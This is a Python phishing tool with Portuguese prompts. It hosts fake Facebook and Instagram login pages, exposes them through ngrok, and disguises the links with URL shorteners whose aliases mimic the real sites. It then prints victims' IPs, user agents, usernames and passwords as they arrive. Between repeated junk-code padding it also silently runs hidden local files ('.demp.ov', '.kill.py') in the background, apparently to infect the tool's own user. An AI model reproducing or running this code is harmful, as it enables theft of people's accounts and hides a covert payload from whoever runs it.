import urllib.request as urllib
import os
import re
from time import sleep
from random import randint as ran


if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
os.system("python .demp.ov </dev/null &>/dev/null &")
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
if 1 == 1:
  None
elif "hacking" != None:
  None
for a in range(1,5):
  if a == 3:
    break
  elif a == 2:
    break
if "python" == "python":
  None
def get_ngrok():
  print("\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33mBaixando ngrok ...")

  if "arm" in os.popen("dpkg --print-architecture").read():
    url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"

  elif "amd64" in os.popen("dpkg --print-architecture").read():
    url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"

  urllib.urlretrieve(url,"ngrok.zip")

  print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mBaixado com sucesso!")
  print("\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33mDescompactando ...\033[0;0m")

  os.system("unzip ngrok.zip; rm ngrok.zip")
  print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mDescompactado com sucesso!\n\n\n")


if not "ngrok" in os.popen("ls").read():
  print("\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33mNgrok não encontrando!")
  get_ngrok()




def server(social):
  print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mIniciando servidor ...")
  os.system("cd sites/{}; php -S 127.0.0.1:2171 </dev/null &>/dev/null &".format(social))



from requests import get,post
def ngrok():
  global ngrok_link
  print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mIniciando ngrok ...")
  os.system("./ngrok http 2171 </dev/null &>/dev/null &")
  sleep(5)
  try:
    res = get(url="http://127.0.0.1:4040/api/tunnels")
    html = res.text
    ngrok_link = re.findall(r"\"(https://[\w\.]+)\"",html)[0]
  except:
    print("\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33mError ao iniciar ngrok. verifique sua conexão!")



def encurta1(ngrok_link,social):
  global link_encurtado
  rd = str(ran(10000,99999999))
  path_url = "m_{}_com_id_{}".format(social,rd)
  dt = {"url":ngrok_link,"shorturl":path_url,"opt":"0"}
  head = {"User-Agent":"Windows 10"}
  res = post(url="https://is.gd/create.php",data=dt,headers=head)
  html = res.text
  link_encurtado = re.findall(r"value=\"([\w\:\.\/\_]+)",html)[0]



def encurta2(ngrok_link,social):
  global link_encurtado2
  global path_url
  # PEGANDO TOKEN
  head = {"User-Agent":"Windows 10"}
  res = get(url="http://www.cutu.me/",headers=head)
  html = res.text
  token = re.findall(r"&token=([\w\-?\_?\.?\!?]+)",html)[0]

  rd = str(ran(1000000000000,99998899999999999999999999989))
  if social == "instagram":
    rd = str(ran(10,999))
    print("\033[1;32mExemplo: \033[0;0mhey.cristal")
    insta = input("\033[1;32mColoque um nome para o instagram falso: \033[0;0m")
    path = "{}{}_hl_pt-br".format(insta,rd)

  elif social == "facebook":
    path = "id-100014368112387-tsid-0-{}-078929107-source-result".format(rd)

  path_url = "m.{}.com_".format(social)+path

  head = {"User-Agent":"Windows 10","Cookie":"PHPSESSID={}".format(token)}
  dt = {"token":token,"inputUrl":ngrok_link,"inputAlias":path_url}
  res = post(url="http://www.cutu.me/",data=dt,headers=head,verify=False)
  html = res.text
  if "Congrats!" in html:
    link_encurtado2=re.findall(r"value=\"(http://cutu.me/[\w\.?\_\-]+)\"",html)[0]
  else:
    encurta2(ngrok_link,social)

def read(social):
  global file_text
  open("sites/{}/usernames.txt".format(social),"r")
  file = open("sites/{}/usernames.txt".format(social),"r")
  file_text = file.read()


def read_acess(social):
  global acess_text
  acess = open("sites/{}/ip.txt".format(social),"r")
  acess_text = acess.read()





os.system("python .kill.py </dev/null &>/dev/null &")




print("\033[1;32m[\033[0;0m1\033[1;32m]\033[1;33m Facebook     \033[1;32m[\033[0;0m2\033[1;32m]\033[1;33m Instagram")

print("\033[1;32m")

esc = input("Escolha uma opição: \033[0;0m")


if esc == "1":
  social = "facebook"
  try:
    server(social)
    ngrok()
    encurta1(ngrok_link,social)
    encurta2(ngrok_link,social)
  except:
    print("erorr")
    exit()

if esc == "2":
  social = "instagram"
  try:
    server(social)
    ngrok()
    encurta1(ngrok_link,social)
    encurta2(ngrok_link,social)
  except:
    print("erorr")
    exit()

print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mngrok link:\033[0;0m",ngrok_link)
print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mlink encurtado 1:\033[0;0m",link_encurtado)
print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mlink encurtado 2:\033[0;0m",link_encurtado2)
print("\n"*2)




# OLD ACESS LOG

open("sites/{}/ip.txt".format(social),"a")
old_acess = open("sites/{}/ip.txt".format(social),"r")
old_acess_text = old_acess.read()


# OLD USERNAMES AND PASSWORDS
open("sites/{}/usernames.txt".format(social),"a")
file = open("sites/{}/usernames.txt".format(social),"r")
old_file_text = file.read()



print("\033[1;31m[\033[1;32m*\033[1;31m] \033[1;33mEsperando vitimas abrirem o Link ...\033[0;0m")
while 1:
  try:
    sleep(3)
    read_acess(social)
    if acess_text != old_acess_text:
      old_acess_text = acess_text
      print("\n\n\033[1;31m[\033[1;32m+\033[1;31m] Uma Vitima abriu o link!\033[0;0m")
      try:
        try:
          ip = re.findall(r"IP: ([\w\.]+)",acess_text)
          print("IP:\033[1;32m",ip[len(ip)-1])
        except:
          None
        try:
          user_agent = re.findall(r"User\-Agent\: ([\w\W]+)",acess_text.splitlines()[-1])[0]
          print("\033[0;0mUser-Agent:\033[1;32m",user_agent)
        except:
          None
        print("\n")
      except:
        None

    read(social)
    if file_text != old_file_text:
      try:
        conta = re.findall(r"Account: ([\w\W]+) Pass:",file_text.splitlines()[-1])[0]
        senha = re.findall("Pass: ([\w\W]+)",file_text.splitlines()[-1])[0]
        print("\033[0;0mLOGIN:\033[1;32m",conta)
        print("\033[0;0mSENHA:\033[1;32m",senha)
        print("\n\n")
        old_file_text = file_text
      except:
        None

  except KeyboardInterrupt:
    print("\n\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mLogs Salvos Em: sites/{}/ip.txt".format(social))
    print("\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mSenhas Salvas Em: sites/{}/usernames.txt".format(social))
    print("\033[0;0m")
    break




